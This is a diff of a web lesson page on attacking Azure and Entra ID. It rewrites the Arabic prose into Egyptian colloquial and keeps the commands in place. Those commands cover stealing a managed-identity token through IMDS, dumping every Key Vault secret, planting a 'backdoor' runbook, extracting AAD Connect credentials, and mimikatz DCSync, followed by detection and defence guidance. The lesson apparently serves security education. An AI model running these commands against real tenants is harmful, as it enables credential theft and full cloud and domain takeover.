@@ -6,29 +6,29 @@ export default function Page() {
     <LessonShell slug="azure-attacks">
       <L
         ar={<>
-          <Section title="لماذا Azure مختلف عن AWS و GCP">
-            <p>Azure مدمج بعمق مع <b>Entra ID</b> (هوية المستخدمين) و <b>Active Directory</b> الكلاسيكي. الاختراق يقفز بين الطبقات: من حساب M365 → إلى Subscription → إلى VM → إلى on-prem AD. هذه الجسور هي ما يجعل Azure هدفاً ذهبياً للمهاجمين الحكوميين.</p>
-            <Analogy>تخيّل مدينتين متجاورتين تربطهما جسور كثيرة. الحارس على كل جسر مختلف، و كثير من الجسور لم يبنها أحد عمداً — وُلدت من اتفاقيات قديمة. المهاجم يبحث عن أضعف جسر لا أقصر طريق.</Analogy>
-            <Callout kind="danger" title="تحذير قانوني">
-              كل ما هنا للاختبار في بيئاتك الخاصة أو ضمن نطاق Pentest مصرّح به. مهاجمة subscription لا تملكها = جريمة اتحادية في معظم الدول.
+          <Section title="ليه Azure مختلف عن AWS و GCP؟">
+            <p>Azure مدمج بعمق مع <b>Entra ID</b> (هوية اليوزرز) ومع <b>Active Directory</b> الكلاسيكي. الاختراق هنا بيقفز بين الطبقات: من حساب M365 → لـ Subscription → لـ VM → لـ on-prem AD. الجسور دي هي اللي بتخلي Azure هدف ذهبي للـ state actors.</p>
+            <Analogy>تخيل مدينتين جنب بعض، بينهم جسور كتير. كل جسر له حارس مختلف، وأغلب الجسور دي محدش بناها بقصد — اتولدت من اتفاقيات قديمة. المهاجم بيدور على أضعف جسر، مش أقصر طريق.</Analogy>
+            <Callout kind="danger" title="تنبيه قانوني">
+              كل اللي هنا للتطبيق في بيئاتك الخاصة أو ضمن نطاق Pentest معاك فيه إذن. مهاجمة subscription مش بتاعتك = جريمة فيدرالية في أغلب الدول.
             </Callout>
           </Section>
 
           <Section title="نموذج الصلاحيات — RBAC + Entra Roles">
             <TwoCol>
               <Card title="Azure RBAC" color="blue">
-                صلاحيات على <b>الموارد</b> (VMs, Storage, KeyVault). تُمنح على Scope: Management Group → Subscription → Resource Group → Resource.
+                صلاحيات على <b>الموارد</b> (VMs, Storage, KeyVault). بتتمنح على Scope: Management Group → Subscription → Resource Group → Resource.
               </Card>
               <Card title="Entra (AAD) Roles" color="amber">
-                صلاحيات على <b>الهوية</b> (User Admin, Global Admin). منفصلة عن RBAC — Global Admin <b>لا يرى</b> Subscriptions تلقائياً (لكن يمكنه رفع نفسه عبر "Access management for Azure resources").
+                صلاحيات على <b>الهوية</b> (User Admin, Global Admin). منفصلة عن RBAC — الـ Global Admin <b>مش بيشوف</b> الـ Subscriptions أوتوماتيك (بس يقدر يرفع نفسه عبر "Access management for Azure resources").
               </Card>
             </TwoCol>
             <Callout kind="info" title="نقطة الضعف الكلاسيكية">
-              Global Admin → فعّل "User Access Administrator at root" → Owner على كل Subscription. خطوتان فقط من تسريب MFA إلى السيطرة الكاملة.
+              Global Admin → فعّل "User Access Administrator at root" → Owner على كل Subscription. كليكتين بس بين تسريب MFA والسيطرة الكاملة.
             </Callout>
           </Section>
 
-          <Section title="الاستطلاع — معرفة Tenant بدون اعتماد">
+          <Section title="الاستطلاع — معلومات عن الـ Tenant من غير اعتماد">
             <Terminal lines={[
               { p: "# هل النطاق tenant Azure؟ معرفة tenant ID:" },
               { p: "curl -s 'https://login.microsoftonline.com/target.gov/.well-known/openid-configuration' | jq .issuer" },
@@ -43,7 +43,7 @@ export default function Page() {
           </Section>
 
           <Section title="Managed Identity — جوهرة المهاجم">
-            <p>عندما تشغّل VM أو Function App في Azure، يمكن منحها <b>Managed Identity</b> — هوية تلقائية مع صلاحيات على موارد أخرى. الفائدة: لا كلمات مرور. المشكلة: من يخترق الـ VM يصبح هذه الهوية فوراً.</p>
+            <p>لما تشغّل VM أو Function App في Azure، تقدر تديها <b>Managed Identity</b> — هوية أوتوماتيك معاها صلاحيات على موارد تانية. الفايدة: مفيش باسوردات. المشكلة: أي حد يخترق الـ VM، بقا هو نفسه الـ identity في ثانية.</p>
             <Terminal lines={[
               { p: "# من داخل VM مخترقة — اطلب token من IMDS" },
               { p: "curl -s -H 'Metadata: true' \\\n  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'" },
@@ -53,16 +53,16 @@ export default function Page() {
               { p: "export AZ_TOKEN=eyJ0eXA..." },
               { p: "az rest --method get --uri 'https://management.azure.com/subscriptions?api-version=2020-01-01' --headers \"Authorization=Bearer $AZ_TOKEN\"" },
             ]} />
-            <Callout kind="info" title="الجواهر">
-              اسأل token لـ <span className="eng">https://vault.azure.net</span> ثم اقرأ Key Vault. أو لـ <span className="eng">https://storage.azure.com</span> و حمّل blobs. أو لـ <span className="eng">https://graph.microsoft.com</span> و اقرأ الـ Tenant.
+            <Callout kind="info" title="الجواهر اللي تطلبها">
+              اطلب token لـ <span className="eng">https://vault.azure.net</span> واقرا Key Vault. أو لـ <span className="eng">https://storage.azure.com</span> ونزّل الـ blobs. أو لـ <span className="eng">https://graph.microsoft.com</span> واقرا الـ Tenant كله.
             </Callout>
           </Section>
 
-          <Section title="Storage Accounts — أكبر مصدر تسريب">
+          <Section title="Storage Accounts — أكبر مصدر للتسريب">
             <ul>
-              <li><b>Public containers</b> — مثل S3 buckets، لكن أصعب اكتشافاً (DNS غير قابل للحرث بسهولة).</li>
-              <li><b>SAS Tokens</b> — مفاتيح مؤقتة. تظهر في كود JavaScript على الـ frontend، Postman, GitHub commits.</li>
-              <li><b>Storage Account Keys</b> — مفتاحان أزليان لكل حساب. من يحصل عليهما = SYSTEM على البيانات.</li>
+              <li><b>Public containers</b> — زي S3 buckets، بس أصعب في الاكتشاف (الـ DNS مش بيتحرث بسهولة).</li>
+              <li><b>SAS Tokens</b> — مفاتيح مؤقتة. بتلاقيها في كود JavaScript على الـ frontend، Postman، commits على GitHub.</li>
+              <li><b>Storage Account Keys</b> — مفتاحين أبديين لكل حساب. اللي معاه واحد منهم = SYSTEM على الداتا.</li>
             </ul>
             <Terminal lines={[
               { p: "# تخمين أسماء حسابات تخزين عامة" },
@@ -77,7 +77,7 @@ export default function Page() {
           </Section>
 
           <Section title="Key Vault — صندوق الأسرار الذهبي">
-            <p>Key Vault يحوي certificates, secrets, keys. الهجوم لا يكسر التشفير — يكسر <b>سياسة الوصول</b>.</p>
+            <p>Key Vault بيحتوي certificates وsecrets وkeys. الهجوم مش بيكسر التشفير — بيكسر <b>سياسة الوصول</b>.</p>
             <Code lang="bash">{`# كل من له get/list secrets يستطيع تنزيل كل شيء
 az keyvault secret list --vault-name target-kv --query '[].name' -o tsv \\
   | while read name; do
@@ -88,12 +88,12 @@ az keyvault secret list --vault-name target-kv --query '[].name' -o tsv \\
 # Soft-delete لا يحميك — يمكن استعادة secret محذوف لمدة 90 يوماً
 az keyvault secret list-deleted --vault-name target-kv`}</Code>
             <Callout kind="good" title="الدفاع">
-              فعّل <b>Purge Protection</b> (لا يمكن إلغاؤها)، RBAC mode بدلاً من Access Policies (أدق)، Private Endpoint، و راقب <span className="eng">SecretGet</span> events في Defender.
+              فعّل <b>Purge Protection</b> (مفيش رجوع)، استخدم RBAC mode بدل Access Policies (أدق)، Private Endpoint، وراقب <span className="eng">SecretGet</span> events في Defender.
             </Callout>
           </Section>
 
-          <Section title="Automation Accounts و Runbooks">
-            <p>Runbook = سكريبت PowerShell يعمل بصلاحيات Run-As Account (غالباً Contributor على Subscription). من يستطيع تعديله = من يصبح Contributor.</p>
+          <Section title="Automation Accounts والـ Runbooks">
+            <p>الـ Runbook = سكريبت PowerShell بيشتغل بصلاحيات Run-As Account (غالباً Contributor على الـ Subscription). أي حد يقدر يعدل عليه، بقى Contributor.</p>
             <Terminal lines={[
               { p: "# إذا لديك Contributor على Automation Account:" },
               { p: "az automation runbook create --resource-group rg --automation-account-name auto1 \\\n  --name backdoor --type PowerShell" },
@@ -101,14 +101,14 @@ az keyvault secret list-deleted --vault-name target-kv`}</Code>
               { p: "az automation runbook publish ..." },
               { p: "az automation runbook start ...   # يعمل بصلاحيات Run-As Identity" },
             ]} />
-            <p>السكريبت <span className="eng">evil.ps1</span> يمكنه إنشاء Service Principal بصلاحيات Owner و إرسال credentials خارج البيئة.</p>
+            <p>الـ <span className="eng">evil.ps1</span> ممكن ينشئ Service Principal بصلاحيات Owner ويبعت الـ credentials بره البيئة.</p>
           </Section>
 
-          <Section title="القفز إلى on-prem — Azure AD Connect">
-            <p>الخادم الذي يشغّل <b>Azure AD Connect</b> يحوي حسابي خدمة كلاهما خطر:</p>
+          <Section title="القفز للـ on-prem — عن طريق Azure AD Connect">
+            <p>الـ server اللي بيشغل <b>Azure AD Connect</b> فيه حسابين خدمة، الاتنين قاتلين:</p>
             <ul>
-              <li><span className="eng">MSOL_*</span> — له صلاحية <b>DCSync</b> على on-prem AD. من يحصل على hash هذا الحساب = يقرأ كل كلمات المرور.</li>
-              <li><span className="eng">Sync_*</span> — له صلاحية على Entra لمزامنة الكلمات. كافٍ لإعادة تعيين كلمة مرور Global Admin سحابي إذا لم يكن "cloud-only".</li>
+              <li><span className="eng">MSOL_*</span> — معاه صلاحية <b>DCSync</b> على on-prem AD. اللي يكسر هاش الحساب ده، بيقرا كل الباسوردات في الدومين.</li>
+              <li><span className="eng">Sync_*</span> — معاه صلاحية على Entra للمزامنة. كفاية إنه يعمل reset لباسورد Global Admin مش "cloud-only".</li>
             </ul>
             <Code lang="powershell">{`# على خادم AAD Connect — استخراج credentials
 adconnectdump.exe   # أو AADInternals: Get-AADIntSyncCredentials
@@ -117,22 +117,22 @@ adconnectdump.exe   # أو AADInternals: Get-AADIntSyncCredentials
 mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator /authuser:MSOL_xxx /authpassword:xxx`}</Code>
           </Section>
 
-          <Section title="الكشف و الدفاع">
-            <Callout kind="good" title="ما يجب أن يراه Blue Team">
+          <Section title="الكشف والدفاع">
+            <Callout kind="good" title="اللي لازم الـ Blue Team يشوفه">
               <ul>
-                <li><b>Sign-in Logs</b> — تسجيل دخول من IP غير معتاد لمسؤول. UEBA risk score &gt; 70.</li>
-                <li><b>Audit Logs</b> — إضافة credential على Service Principal، تغيير Conditional Access policies، رفع role.</li>
-                <li><b>Activity Log</b> — على Subscription: <span className="eng">Microsoft.Authorization/roleAssignments/write</span>، <span className="eng">Microsoft.KeyVault/vaults/secrets/getSecret</span> من principal غير معتاد.</li>
-                <li><b>Defender for Cloud</b> — يكشف Managed Identity token abuse و IMDS من شبكة غير معتادة.</li>
+                <li><b>Sign-in Logs</b> — أدمن بيدخل من IP غريب. UEBA risk score &gt; 70 = جرس إنذار.</li>
+                <li><b>Audit Logs</b> — إضافة credential على Service Principal، تعديل Conditional Access policies، رفع role.</li>
+                <li><b>Activity Log</b> — على الـ Subscription: <span className="eng">Microsoft.Authorization/roleAssignments/write</span>، <span className="eng">Microsoft.KeyVault/vaults/secrets/getSecret</span> من principal مش معتاد.</li>
+                <li><b>Defender for Cloud</b> — بيكشف Managed Identity token abuse وIMDS من شبكة مش معتادة.</li>
               </ul>
             </Callout>
             <ul>
-              <li>طبّق <b>Conditional Access</b> على كل دور إداري — تصلب MFA + Trusted Locations + Compliant Device.</li>
-              <li>استخدم <b>Privileged Identity Management (PIM)</b> — أدوار Just-In-Time مع تفعيل و موافقة.</li>
-              <li>فصل <b>Break-Glass accounts</b> (2 على الأقل) خارج Conditional Access مع تنبيه عند كل استخدام.</li>
-              <li>راجع Service Principals كل أسبوع — كثير منها ينسى مع credentials لا تنتهي.</li>
+              <li>طبّق <b>Conditional Access</b> على كل دور إداري — MFA قوي + Trusted Locations + Compliant Device.</li>
+              <li>استخدم <b>Privileged Identity Management (PIM)</b> — أدوار Just-In-Time مع تفعيل وموافقة.</li>
+              <li>اعزل <b>Break-Glass accounts</b> (اتنين على الأقل) بره الـ Conditional Access، وحط تنبيه على كل استخدام.</li>
+              <li>راجع الـ Service Principals كل أسبوع — كتير منهم بينسى ومعاه credentials مالهاش انتهاء.</li>
             </ul>
-            <Callout kind="info" title="أدوات Red Team">
+            <Callout kind="info" title="أدوات الـ Red Team">
               <span className="eng">AADInternals, ROADtools, MicroBurst, AzureHound, Stormspotter, MSOLSpray, TokenTactics</span>.
             </Callout>
           </Section>
